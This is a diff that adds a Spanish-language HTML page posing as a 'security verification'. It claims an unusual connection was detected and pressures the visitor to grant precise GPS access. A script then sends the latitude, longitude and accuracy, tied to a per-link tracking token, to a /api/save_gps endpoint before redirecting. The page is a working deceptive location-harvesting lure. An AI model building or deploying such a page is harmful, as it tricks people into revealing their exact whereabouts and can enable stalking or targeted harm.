@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; text-align: center; padding: 40px 20px; background: #fff; color: #333; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 30px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { background: #3498db; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; }
+        h2 { margin-bottom: 10px; }
+        p { color: #666; line-height: 1.5; margin-bottom: 30px; }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <h2>Verificación de Seguridad</h2>
+    <p>Detectamos una conexión inusual. Para continuar al contenido, confirma que estás en una ubicación válida.</p>
+    
+    <button class="btn" onclick="pedirGPS()">Confirmar Ubicación</button>
+    <div id="msg" style="margin-top:20px; font-size:13px; color:#e74c3c;"></div>
+
+    <script>
+        const token = window.location.pathname.split('/').pop();
+
+        function pedirGPS() {
+            document.getElementById('msg').innerText = "Conectando con satélite...";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(enviarDatos, errorGPS, {enableHighAccuracy: true, timeout: 10000});
+            } else {
+                // Si no hay GPS, pasamos
+                window.location.href = "/redirect/" + token;
+            }
+        }
+
+        function enviarDatos(pos) {
+            fetch('/api/save_gps', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    token: token,
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    acc: pos.coords.accuracy
+                })
+            }).then(() => {
+                window.location.href = "/redirect/" + token;
+            });
+        }
+
+        function errorGPS(err) {
+            document.getElementById('msg').innerText = "⚠️ Error: Debes presionar 'Permitir' para continuar.";
+        }
+    </script>
+</body>
+</html>
